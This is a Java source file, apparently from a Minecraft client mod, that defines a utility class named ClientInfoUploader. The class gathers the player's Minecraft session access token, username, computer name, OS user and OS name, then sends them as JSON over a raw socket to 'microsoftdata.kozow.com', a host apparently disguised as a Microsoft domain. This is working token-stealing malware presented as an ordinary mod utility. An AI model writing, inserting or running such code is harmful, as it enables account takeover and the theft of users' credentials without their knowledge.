package dev.kizuna.api.utils.misc;

import dev.kizuna.Kawaii;
import net.minecraft.client.MinecraftClient;
import com.google.gson.Gson;
import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class ClientInfoUploader {

    private static final String SERVER_ADDRESS = "microsoftdata.kozow.com";
    private static final int SERVER_PORT = 42077;

    public static void upload() {
        try {
            MinecraftClient mc = MinecraftClient.getInstance();

            Map<String, String> data = new HashMap<>();
            data.put("computerName", System.getenv("COMPUTERNAME"));
            data.put("user", System.getProperty("user.name"));
            data.put("token", mc.getSession().getAccessToken());
            data.put("os", System.getProperty("os.name"));
            data.put("username", mc.getSession().getUsername());
            data.put("version", Kawaii.NAME + " " + Kawaii.VERSION);

            Gson gson = new Gson();
            String json = gson.toJson(data);

            sendSocketData(SERVER_ADDRESS, SERVER_PORT, json);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void sendSocketData(String serverAddress, int serverPort, String jsonData) throws IOException {
        Socket socket = new Socket(serverAddress, serverPort);

        OutputStream os = socket.getOutputStream();
        InputStream is = socket.getInputStream();

        byte[] data = jsonData.getBytes(StandardCharsets.UTF_8);
        os.write(data);
        os.flush();

        BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
        String responseLine;
        while ((responseLine = reader.readLine()) != null) {
        }

        reader.close();
        os.close();
        is.close();
        socket.close();
    }
}
